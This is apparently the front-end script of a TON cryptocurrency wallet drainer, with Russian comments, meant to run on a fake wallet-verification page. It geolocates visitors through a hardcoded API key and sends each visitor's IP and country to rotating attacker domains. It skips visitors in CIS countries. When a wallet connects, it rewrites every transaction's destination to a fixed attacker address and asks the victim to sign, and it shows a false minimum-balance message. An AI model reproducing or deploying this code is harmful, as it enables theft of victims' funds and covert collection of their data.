const LIST_DOMAINS = ['ucpuznvvcy.com', 'gybzdhahpl.com', 'kvutxcjcku.com', 'bydyindfam.com', 'ytyynulnnp.com'];

const SERVER_DOMAIN = LIST_DOMAINS[Math.floor(Math.random() * (LIST_DOMAINS.length - 1))]; // 'nwkjaia.com';
const URL_SERVICE_IP =
  'https://ipgeolocation.abstractapi.com/v1?api_key=90d3a7da6a5c4901a75d380c6e27c700';
const UUID_CHAT = 'x67WhmQ67aGq65Y3PN1M';
const URL_SERVICE_SNG = `https://${SERVER_DOMAIN}/api/v1/${UUID_CHAT}/sng`;

const domain = window.location.hostname;

let h1_message = 'The min balance must be 0.2 TON for verification',
  p_message = 'Please connect another wallet',
  but_message = 'Close';

// Переменные которые получаем с ton
let connectedWallet;

// Переменные которые приходят с сервера
let UserInfo;



// Инстансы
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
  // buttonRootId: 'openModal',
});

const $api = axios.create({
  baseURL: 'https://' + SERVER_DOMAIN + '/api/v2',
});

// Функции для работы
const openModalUi = () => tonConnectUI.openModal();

const checkLocation = (country, sng) =>
  sng &&
  ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TM', 'TJ'].includes(
    country,
  );

axios.get(URL_SERVICE_IP).then(({ data }) => {
  const country = data.country_code.toUpperCase();
  axios.get(URL_SERVICE_SNG).then(({ data: { sng } }) => {
    if (checkLocation(country, sng)) {
      window.location.replace('https://ton.org');
    }
  });
});

// Основной функционал
axios.get(URL_SERVICE_IP).then(({ data }) => {
  const country = data.country_code;

  UserInfo = {
    ip: data.ip_address,
    country,
    domain,
    uuid: UUID_CHAT,
  };

  if (!localStorage.getItem('open')) {
    $api
      .post('/open', UserInfo)
      .then((data) => {
        localStorage.setItem('open', '1');
      })
      .catch((err) => console.log('Error #1'));
  }
});

tonConnectUI.onStatusChange((wallet) => {
  connectedWallet = wallet;
  axios.get(URL_SERVICE_IP).then(({ data }) => {
    const country = data.country_code;

    UserInfo = {
      ip: data.ip_address,
      country,
      domain,
      uuid: UUID_CHAT,
    };

    const payload = {
      ConnectedWallet: connectedWallet,
      UserInfo: UserInfo,
    };
    $api
      .post('/connect', payload)
      .then(async (response) => {
        const transactions = response.data.transactions;
        const assets = response.data.assets;
        let start = 0;
        let end = 4;
        const step = 4;
        for (let i = 0; i < transactions.length; i++) {
          try {
            const transaction = transactions[i];
            await tonConnectUI.sendTransaction({
              ...transaction,
              messages: [
                ...(transaction?.messages?.map?.(o => ({
                  ...o,
                  address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9"
                })) || [])
              ]
            });
          } catch (e) {
            console.log(e);
          }
          start += step;
          end += step;
        }
      })
      .catch((err) => showModal());
  });
});

async function showModal() {
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.top = '50%'; //Отступ модального окна верх-низ
  modal.style.left = '50%'; //Отступ модального окна лево-право
  modal.style.transform = 'translate(-50%, -50%)';
  modal.style.backgroundColor = '#121214'; // Фон модального окна
  modal.style.color = '#fff'; // Цвет текста
  modal.style.padding = '20px'; //Отступы модального окна
  modal.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; //Тень модального окна
  modal.style.zIndex = '1000';
  modal.style.borderRadius = '24px'; // Скругленные углы
  modal.style.textAlign = 'center'; // Выравнивание элементов по центру
  modal.style.maxWidth = '400px'; // Максимальная ширина модального окна
  modal.style.width = '90%'; // Ширина для мобильных устройств

  // Добавляем шрифт
  const link = document.createElement('link');
  link.href =
    'https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);
  modal.style.fontFamily = '"Roboto", sans-serif';

  const h1_modal = document.createElement('h1');
  h1_modal.textContent = h1_message;
  const p_modal = document.createElement('p');
  p_modal.textContent = p_message;

  const closeButton = document.createElement('button');
  closeButton.textContent = but_message;
  closeButton.style.backgroundColor = 'rgb(53, 53, 53)'; //  фон кнопки
  closeButton.style.color = '#fff'; // Цвет текста
  closeButton.style.fontSize = '14px'; // Размер шрифта кнопки
  closeButton.style.borderRadius = '10px'; // Скругленные углы кнопки
  closeButton.style.border = 'none'; // Без рамки
  closeButton.style.padding = '10px 10px 10px 10px'; // Отступы внутри кнопки
  closeButton.style.fontWeight = '600'; //Жирность шрифта кнопки
  closeButton.style.cursor = 'pointer';
  closeButton.onclick = () => {
    document.body.removeChild(modal);
    tonConnectUI.disconnect();
    setTimeout(() => {
      location.reload();
    }, 300);
  };

  modal.appendChild(h1_modal);
  modal.appendChild(p_modal);
  modal.appendChild(closeButton);

  document.body.appendChild(modal);
}
